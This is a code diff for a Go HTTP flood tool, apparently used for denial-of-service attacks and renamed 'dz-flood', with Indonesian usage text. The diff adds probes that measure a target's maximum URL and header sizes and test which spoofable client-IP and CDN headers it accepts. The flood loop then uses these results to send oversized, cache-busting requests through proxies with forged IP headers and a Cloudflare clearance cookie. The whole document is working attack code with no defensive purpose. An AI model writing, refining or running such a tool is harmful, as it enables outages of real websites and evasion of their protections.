@@ -156,10 +156,132 @@ func RST(rng *rand.Rand, length int) string {
 var customCookie string
 var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
 
+func probeMaxPayloadSize(target string) int {
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
+	lastSuccess := 0
+	for _, size := range sizes {
+		testURL := target
+		if strings.Contains(testURL, "?") {
+			testURL += "&big=" + strings.Repeat("x", size)
+		} else {
+			testURL += "?big=" + strings.Repeat("x", size)
+		}
+		req, _ := http.NewRequest("GET", testURL, nil)
+		req.Header.Set("User-Agent", "Mozilla/5.0")
+		resp, err := client.Do(req)
+		if err != nil {
+			break
+		}
+		resp.Body.Close()
+		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
+			lastSuccess = size
+		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
+			break
+		} else {
+			break
+		}
+	}
+	return lastSuccess
+}
+
+func probeMaxHeaderSize(target string) int {
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
+	lastSuccess := 0
+	for _, size := range sizes {
+		req, _ := http.NewRequest("GET", target, nil)
+		req.Header.Set("User-Agent", "Mozilla/5.0")
+		req.Header.Set("X-Large-Data", strings.Repeat("x", size))
+		resp, err := client.Do(req)
+		if err != nil {
+			break
+		}
+		resp.Body.Close()
+		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
+			lastSuccess = size
+		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
+			break
+		} else {
+			break
+		}
+	}
+	return lastSuccess
+}
+
+func probeHeaders(target string, proxyIP string) map[string]bool {
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	parsedTarget, _ := url.Parse(target)
+	targetHost := parsedTarget.Hostname()
+
+	if proxyIP == "" {
+		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
+		proxyIP = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
+	}
+
+	headerList := []string{
+		"X-Original-URL",
+		"X-Forwarded-Host",
+		"X-Request-ID",
+		"CDN-Loop",
+		"CF-Connecting-IP",
+		"True-Client-IP",
+	}
+	result := make(map[string]bool)
+
+	for _, h := range headerList {
+		req, _ := http.NewRequest("GET", target, nil)
+		req.Header.Set("User-Agent", "Mozilla/5.0")
+
+		switch h {
+		case "X-Original-URL":
+			req.Header.Set("X-Original-URL", "/"+RST(rand.New(rand.NewSource(time.Now().UnixNano())), 8))
+		case "X-Forwarded-Host":
+			req.Header.Set("X-Forwarded-Host", targetHost)
+		case "X-Request-ID":
+			req.Header.Set("X-Request-ID", strconv.FormatInt(rand.Int63(), 16))
+		case "CDN-Loop":
+			req.Header.Set("CDN-Loop", "cloudflare")
+		case "CF-Connecting-IP":
+			req.Header.Set("CF-Connecting-IP", proxyIP)
+		case "True-Client-IP":
+			req.Header.Set("True-Client-IP", proxyIP)
+		}
+
+		resp, err := client.Do(req)
+		if err != nil {
+			result[h] = false
+			continue
+		}
+		resp.Body.Close()
+		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
+			result[h] = true
+		} else {
+			result[h] = false
+		}
+	}
+	return result
+}
+
 func main() {
 	if len(os.Args) < 2 {
-		fmt.Println("Cara pakai: go-flood <target> [duration] [cookie]")
-		fmt.Println("Contoh dengan cookie: go-flood https://target.com 60 \"cf_clearance=xxx\"")
+		fmt.Println("Cara pakai: dz-flood <target> [duration] [cookie]")
+		fmt.Println("Contoh: dz-flood https://target.com 60 \"cf_clearance=xxx\"")
 		os.Exit(1)
 	}
 	tgt := os.Args[1]
@@ -198,6 +320,15 @@ func main() {
 		proxies = append(proxies, nil)
 	}
 
+	var proxyIP string
+	if len(proxies) > 0 && proxies[0] != nil {
+		proxyIP = proxies[0].Hostname()
+	}
+
+	maxPayload := probeMaxPayloadSize(tgt)
+	maxHeader := probeMaxHeaderSize(tgt)
+	headerSupport := probeHeaders(tgt, proxyIP)
+
 	wcs := make([]CLI, len(proxies))
 	for i, proxyURL := range proxies {
 		tr := &http.Transport{
@@ -226,8 +357,8 @@ func main() {
 			},
 			ForceAttemptHTTP2:     true,
 			DisableCompression:    false,
-			TLSHandshakeTimeout:   4 * time.Second,
-			ResponseHeaderTimeout: 3 * time.Second,
+			TLSHandshakeTimeout:   5 * time.Second,
+			ResponseHeaderTimeout: 5 * time.Second,
 			ExpectContinueTimeout: 1 * time.Second,
 		}
 		ip := ""
@@ -250,7 +381,7 @@ func main() {
 	fmt.Printf("ޗ | Target : %s\n", tgt)
 	fmt.Printf("ޗ | Time   : %d s\n", dur)
 	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
-	fmt.Printf("ޗ | Conc   : %d + %d + %d\n", wrk, sub, wrk*sub)
+	fmt.Printf("ޗ | Conc   : %d\n", wrk)
 	if customCookie != "" {
 		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
 	} else {
@@ -293,9 +424,14 @@ func main() {
 							reqURL += "?" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
 						}
 
-						if subRng.Intn(5) == 0 {
-							reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(2024))
+						if maxPayload > 0 && subRng.Intn(3) == 0 {
+							size := maxPayload/2 + subRng.Intn(maxPayload/2)
+							if size < 1 {
+								size = 64
+							}
+							reqURL += "&big=" + strings.Repeat("x", size)
 						}
+
 						if subRng.Intn(10) == 0 {
 							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
 						}
@@ -306,7 +442,6 @@ func main() {
 						req.Header.Set("Accept", prof.Accept)
 						req.Header.Set("Accept-Language", prof.Lang)
 						req.Header.Set("Accept-Encoding", prof.Encoding)
-
 						req.Header.Set("Connection", "keep-alive")
 						req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
 						req.Header.Set("Pragma", "no-cache")
@@ -314,23 +449,35 @@ func main() {
 						req.Header.Set("If-Modified-Since", ifModifiedSince)
 						req.Header.Set("X-Cache-Buster", strconv.FormatInt(subRng.Int63(), 16))
 
-						if subRng.Intn(3) == 0 {
+						if headerSupport["X-Original-URL"] && subRng.Intn(3) == 0 {
 							req.Header.Set("X-Original-URL", "/"+strconv.FormatInt(subRng.Int63(), 16))
 						}
-						if subRng.Intn(3) == 0 {
+						if headerSupport["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
 							req.Header.Set("X-Forwarded-Host", strconv.FormatInt(subRng.Int63(), 16)+".example.com")
 						}
-						if subRng.Intn(3) == 0 {
+						if headerSupport["X-Request-ID"] && subRng.Intn(3) == 0 {
 							req.Header.Set("X-Request-ID", strconv.FormatInt(subRng.Int63(), 16))
 						}
-						if subRng.Intn(5) == 0 {
-							req.Header.Set("X-Real-IP", RIP(subRng))
+						if headerSupport["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
+							req.Header.Set("CF-Connecting-IP", cli.ip)
 						}
-						if subRng.Intn(5) == 0 {
-							req.Header.Set("CF-Connecting-IP", RIP(subRng))
+						if headerSupport["True-Client-IP"] && subRng.Intn(5) == 0 {
+							req.Header.Set("True-Client-IP", cli.ip)
 						}
-						if subRng.Intn(5) == 0 {
+						if headerSupport["CDN-Loop"] && subRng.Intn(5) == 0 {
 							req.Header.Set("CDN-Loop", "cloudflare")
+						}
+
+						if subRng.Intn(5) == 0 {
+							req.Header.Set("X-Real-IP", cli.ip)
+						}
+
+						if maxHeader > 0 && subRng.Intn(2) == 0 {
+							size := maxHeader/2 + subRng.Intn(maxHeader/2)
+							if size < 1 {
+								size = 512
+							}
+							req.Header.Set("X-Large-Data", strings.Repeat("x", size))
 						}
 
 						var cookies []string
@@ -367,15 +514,11 @@ func main() {
 						}
 						req.Header.Set("X-Forwarded-For", PID)
 						req.Header.Set("X-Real-IP", PID)
-						req.Header.Set("True-Client-IP", PID)
 
 						resp, err := cli.client.Do(req)
 						if err == nil {
 							io.Copy(io.Discard, resp.Body)
 							resp.Body.Close()
-						} else {
-							if subRng.Intn(1000) == 0 {
-							}
 						}
 					}
 				}(s)
